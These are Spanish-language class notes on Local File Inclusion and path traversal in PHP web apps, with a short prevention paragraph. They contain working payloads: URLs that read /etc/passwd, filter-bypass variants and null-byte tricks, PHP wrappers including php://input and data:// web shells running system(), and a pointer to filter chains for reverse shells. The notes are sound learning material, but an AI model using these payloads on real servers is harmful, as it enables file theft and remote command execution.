
---
- tags: #vulnerabilidad  #web 
----

La vulnerabilidad **Local File Inclusion** (**LFI**) es una vulnerabilidad de seguridad informática que se produce cuando una aplicación web **no valida adecuadamente** las entradas de usuario, permitiendo a un atacante **acceder a archivos locales** en el servidor web.

En muchos casos, los atacantes aprovechan la vulnerabilidad de LFI al abusar de parámetros de entrada en la aplicación web. Los parámetros de entrada son datos que los usuarios ingresan en la aplicación web, como las URL o los campos de formulario. Los atacantes pueden manipular los parámetros de entrada para incluir rutas de archivo local en la solicitud, lo que puede permitirles acceder a archivos en el servidor web. Esta técnica se conoce como “**Path Traversal**” y se utiliza comúnmente en ataques de LFI.

En el ataque de Path Traversal, el atacante utiliza caracteres especiales y caracteres de escape en los parámetros de entrada para navegar a través de los directorios del servidor web y acceder a archivos en ubicaciones sensibles del sistema.

Por ejemplo, el atacante podría incluir “**../**” en el parámetro de entrada para navegar hacia arriba en la estructura del directorio y acceder a archivos en ubicaciones sensibles del sistema.

Para prevenir los ataques LFI, es importante que los desarrolladores de aplicaciones web validen y filtren adecuadamente la entrada del usuario, limitando el acceso a los recursos del sistema y asegurándose de que los archivos sólo se puedan incluir desde ubicaciones permitidas. Además, las empresas deben implementar medidas de seguridad adecuadas, como el cifrado de archivos y la limitación del acceso de usuarios no autorizados a los recursos del sistema.

A continuación, se os proporciona el enlace directo a la herramienta que utilizamos al final de esta clase para abusar de los ‘**Filter Chains**‘ y conseguir así ejecución remota de comandos:

- **PHP Filter Chain Generator**: [https://github.com/synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator)

---

Esta vulnerabilidad se podría aprovechar cambiando el archivo a cargar por una ruta del archivo que queramos. 

```url
localhost/index.php?filename=test
```

``` url
localhost/index.php?filename=/etc/passwd
```

Como podemos observar en los ejemplos anteriores cambiando el archivo al que apunta se podría ver otros ficheros a parte de los que el programador expuso.

- Para saltarnos las posibles sanitizaciones que el programador pueda realizar podemos hacer uso del **Undirectory path traversal** que consiste en concatenar ../ para movernos entre los directorios hasta la raíz del sistema.
- Podría estar sanitizado también de tal manera que no permita poner ../ pero se puede intentar atravesar de la manera ....// y con eso conseguimos que la sanitización no surta efecto. 
- Si estan utilizando expresiones regulares para realizar la sanitización, podríamos intentar saltárnosla así pass?,  ?assw? ,etc o haciendo uso de ////// o ./  porque no es necesario escribir los archivos completos en algunas versiones y las barras y punto barra te deja en el directorio actual de trabajo.

``` url
localhost/index.php?filename=/e?////////././////?pass?/./.
```

podemos ver que los barra punto también se puede poner al final.

- Si están intentando forzar la extensión de archivo podríamos intentar concatenar un null byte al final de la url %00 o "\0" 

``` url
localhost/index.php?filename=/e?////////././////?pass?%00
```

con esto conseguimos que solo nos tenga en cuenta nuestro string

---
**WRAPPERS**

- Cuando no podemos obtener acceso a un recurso por algún tipo de sanitización lo que podemos intentar es aplicar algún tipo de wrapper para obtener la información de ese archivo pero convertido a otra cosa

``` url
localhost/index.php?filename=php://filter/convert.base64-encode/resource=test
```

Wrappers interesantes de conocer

- no suele funcionar pero permite ejecutar codigo directamente
```
expect://whoami
```


- Si tiene la interpretación de php activada podría funcionar para la ejecución de comandos remotos cambiando la petición de get a post.
```
php://input

<?php system("whoami") ?>
```

- lo anterior también se podría hacer de esta manera
```
data://text/plain;base64,<codigo php malicioso a ejecutar en base 64>&cmd=<comando a ejecutar>

<?php system($_GET["cmd"]) ?>
```

- Lo potente de todo esto es jugar con una técnica llamada **filter chain** que existe un recurso que te genera una cadena de filtro de encode y decode que permite ejecutar comandos con los que podríamos conseguir una reverse shell. (buscar por internet)

